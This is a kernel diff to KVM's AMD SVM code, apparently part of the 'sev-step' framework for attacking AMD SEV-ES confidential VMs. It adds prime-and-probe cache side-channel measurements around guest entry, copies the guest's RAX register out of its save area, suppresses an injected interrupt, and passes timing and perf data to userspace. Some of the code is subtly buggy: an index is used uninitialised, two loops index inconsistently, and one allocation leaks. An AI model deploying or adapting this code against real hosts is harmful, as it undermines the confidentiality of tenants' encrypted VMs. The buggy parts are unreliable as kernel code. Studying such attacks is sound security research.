@@ -45,6 +45,7 @@
 //SEV STEP
 #include <linux/sev-step/my_idt.h>
 #include <linux/sev-step/userspace_page_track_api.h>
+#include <linux/sev-step/sev-step.h>
 
 #include "svm.h"
 #include "svm_ops.h"
@@ -3796,6 +3797,7 @@ static fastpath_t svm_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
 
 static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 {
+	void* chase = NULL;
 	struct vcpu_svm *svm = to_svm(vcpu);
 	unsigned long vmcb_pa = svm->current_vmcb->pa;
 
@@ -3809,21 +3811,48 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 		if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
 			printk("calculate_steps before: irqs_disabled?: 0x%x",irqs_disabled());
 			calculate_steps(&global_sev_step_config);
+			//always prepare and do chase, otherwise we would need to adjust single stepping timer for cache attack case
+			if( global_sev_step_config.cache_attack_config != NULL) {
+				//TODO: probe_chase is just for testing double ev
+				cpu_fillEvSetRandomized(&chase,
+					&global_sev_step_config.cache_attack_config->eviction_sets[global_sev_step_config.cache_attack_config->victim_lookup_table_idx]
+				);
+				cpu_prime_pointer_chasing(chase);
+				cpu_prime_pointer_chasing(chase);
+				cpu_prime_pointer_chasing(chase);
+				if( global_sev_step_config.cache_attack_config != NULL &&
+					global_sev_step_config.cache_attack_config->status == SEV_STEP_CACHE_ATTACK_WANT_PRIME &&
+					global_sev_step_config.cache_attack_config->type != SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING) {
+						global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_WANT_PROBE;
+				}
+			}
 		}
 		mutex_unlock(&sev_step_config_mutex);
 
 		//function checks if single stepping is enabled
+		kvm_guest_enter_irqoff();
+
 		my_idt_start_apic_timer(&global_sev_step_config, svm);
 
-		kvm_guest_enter_irqoff();
 		//luca: assembly code in svm/vmenter.S
-		__svm_sev_es_vcpu_run(vmcb_pa);
+		__svm_sev_es_vcpu_run(vmcb_pa,chase);
 		kvm_guest_exit_irqoff();
 
 		mutex_lock(&sev_step_config_mutex);
 		if(sev_step_is_single_stepping_active(&global_sev_step_config)) {
+			if( global_sev_step_config.cache_attack_config != NULL &&
+					global_sev_step_config.cache_attack_config->status == SEV_STEP_CACHE_ATTACK_WANT_PROBE &&
+					global_sev_step_config.cache_attack_config->type != SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING) {
+
+				printk("%s:%d : setting cache attack status to SEV_STEP_CACHE_ATTACK_HAVE_RESULT",__FILE__,__LINE__);
+				global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_HAVE_RESULT;
+			}
 			printk("calculate_steps after: irqs_disabled?: 0x%x",irqs_disabled());
 			calculate_steps(&global_sev_step_config);
+			if( ( (svm->vmcb->control.event_inj & 0xff)== 0xec) && (svm->vcpu.arch.interrupt.injected ) ) {
+				printk("new exeception ignore triggered\n");
+				svm->vcpu.arch.interrupt.injected = false;
+		}
 		}
 		mutex_unlock(&sev_step_config_mutex);
 
@@ -3831,12 +3860,21 @@ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu)
 	mutex_lock(&sev_step_config_mutex);
 	if(global_sev_step_config.decrypt_rip) {
 		struct vmcb_save_area vmcb_sa;
-		if( sev_step_get_vmcb_save_area(&svm->vcpu,&vmcb_sa) ) {
+		struct sev_es_save_area* vmsa;
+		vmsa = kmalloc(sizeof(struct sev_es_save_area), GFP_KERNEL);
+		if( sev_step_get_vmcb_save_area(&svm->vcpu,&vmcb_sa,vmsa) ) {
 			printk("sev_step_get_vmcb_save_area failed\n");
-		}
+		} 
+		
+		
 		//TODO: return here once we figured out if we can take a spinlock in isr_wrapper
 		global_sev_step_config.rip = vmcb_sa.rip;
+		if( vmsa != NULL ) {
+			global_sev_step_config.rax = vmsa->rax;
+		}
+		printk("%s:%d setting global_sev_step_config.rax to 0x%llx\n",__FILE__,__LINE__,global_sev_step_config.rax);
 		global_sev_step_config.decrypt_rip = false;
+		kfree(vmsa);
 	}
 	mutex_unlock(&sev_step_config_mutex);
 
@@ -3919,8 +3957,16 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 
 
 	mutex_lock(&sev_step_config_mutex);
+	if( !global_sev_step_config.state_save_values_valid ) {
+		global_sev_step_config.vmsa_hpa = svm->vmcb->control.vmsa_pa;
+		global_sev_step_config.vmcb_hpa = svm->current_vmcb->pa;
+		global_sev_step_config.vmcb_control_kern_vaddr = (uint64_t)(&svm->vmcb->control);
+		global_sev_step_config.state_save_values_valid = true;
+	}
+
+
 	if(global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_DISABLED_WANT_INIT ) {
-		setup_perfs();
+		setup_perfs(&global_sev_step_config);
 		printk("svm_vcpu_run: prepared PERF");
 		my_idt_install_handler(&global_sev_step_config);
 		printk("svm_vcpu_run: installed my_idt handler\n");
@@ -4090,8 +4136,87 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 		int send_ret = 0;
 		sev_step_event_t ss_event = {
 			.counted_instructions = global_sev_step_config.counted_instructions,
-			.sev_rip = global_sev_step_config.rip, 
+			.sev_rip = global_sev_step_config.rip,
+			.sev_rax = global_sev_step_config.rax,
+			.cache_attack_timings = NULL,
+			.cache_attack_perf_values = NULL,
+			.cache_attack_data_len = 0,
 		};
+		if( global_sev_step_config.cache_attack_config != NULL && 
+			global_sev_step_config.cache_attack_config->status ==  SEV_STEP_CACHE_ATTACK_HAVE_RESULT &&
+			global_sev_step_config.cache_attack_config->type != SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING ) {
+			addr_list_entry_t *e;
+			unsigned i = 0;
+			uint64_t eviction_set_idx = global_sev_step_config.cache_attack_config->victim_lookup_table_idx;
+			addr_list_t* eviction_set = &global_sev_step_config.cache_attack_config->eviction_sets[eviction_set_idx];
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+					uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+					uint64_t timing = ((uint64_t*)(e->addr))[0];
+					uint64_t perf_diff = ((uint64_t*)(e->addr))[1];
+				//cpu_probe_pointer_chasing_inplace writes measurment data to the addr stored in e->addr
+				printk("%s:%d : elem %u\t, offset 0x%03llx, time %llu, perf diff %llu\n",__FILE__,__LINE__,
+					i/64, offset, timing, perf_diff);
+				i += 64;
+				ss_event.cache_attack_data_len += 1;
+			}
+			printk("\n\n\n");
+
+			//allocate dynamic timing array in event and copy timing values
+			ss_event.cache_attack_timings = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+			ss_event.cache_attack_perf_values = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+
+			i = 0;
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+				uint64_t timing = ((uint64_t*)(e->addr))[0];
+				uint64_t perf_diff = ((uint64_t*)(e->addr))[1];
+				ss_event.cache_attack_timings[i] = timing;
+				ss_event.cache_attack_perf_values[i] = perf_diff;
+				i += 1;
+			}
+
+			global_sev_step_config.cache_attack_config->status =  SEV_STEP_CACHE_ATTACK_IDLE;
+		}
+		if( global_sev_step_config.cache_attack_config != NULL && 
+			global_sev_step_config.cache_attack_config->status ==  SEV_STEP_CACHE_ATTACK_HAVE_RESULT &&
+			global_sev_step_config.cache_attack_config->type == SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING ) {
+
+			addr_list_entry_t *e;
+			unsigned i = 0;
+			int readings_idx;
+			uint64_t eviction_set_idx = global_sev_step_config.cache_attack_config->victim_lookup_table_idx;
+			uint64_t* readings = global_sev_step_config.cache_attack_config->chase_result_for_aliasing_attack;
+			addr_list_t* eviction_set = &global_sev_step_config.cache_attack_config->eviction_sets[eviction_set_idx];
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+					uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+					uint64_t timing = readings[2*readings_idx];
+					uint64_t perf_diff = readings[(2*readings_idx)+1];
+				//cpu_probe_pointer_chasing_inplace writes measurment data to the addr stored in e->addr
+				printk("%s:%d : elem %u\t, offset 0x%03llx, time %llu, perf diff %llu\n",__FILE__,__LINE__,
+					i/64, offset, timing, perf_diff);
+				i += 64;
+				readings_idx += 1;
+				ss_event.cache_attack_data_len += 1;
+			}
+			printk("\n\n\n");
+			
+			//allocate dynamic timing array in event and copy timing values
+			ss_event.cache_attack_timings = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+			ss_event.cache_attack_perf_values = kmalloc(sizeof(uint64_t) * ss_event.cache_attack_data_len, GFP_KERNEL);
+
+			i = 0;
+			readings_idx = 0;
+			for (e = eviction_set->first; e != NULL; e = e->next) {
+				uint64_t timing = readings[readings_idx];
+				uint64_t perf_diff = readings[readings_idx+1];
+				ss_event.cache_attack_timings[i] = timing;
+				ss_event.cache_attack_perf_values[i] = perf_diff;
+				i += 1;
+				readings_idx += 2;
+			}
+
+			global_sev_step_config.cache_attack_config->status =  SEV_STEP_CACHE_ATTACK_IDLE;
+		}
+		
 
 		if( global_sev_step_config.single_stepping_status == SEV_STEP_STEPPING_STATUS_ENABLED_WANT_DISABLE ) {
 			printk("ignoring single step event, as user already requestd signle step disable\n");
@@ -4114,6 +4239,9 @@ static __no_kcsan fastpath_t svm_vcpu_run(struct kvm_vcpu *vcpu)
 			default:
 				printk("usp_send_and_block: Failed in svm_vcpu_run with %d",send_ret);
 				break;
+			}
+			if( ss_event.cache_attack_timings != NULL ) {
+				kfree(ss_event.cache_attack_timings);
 			}
 		}
 	} else {
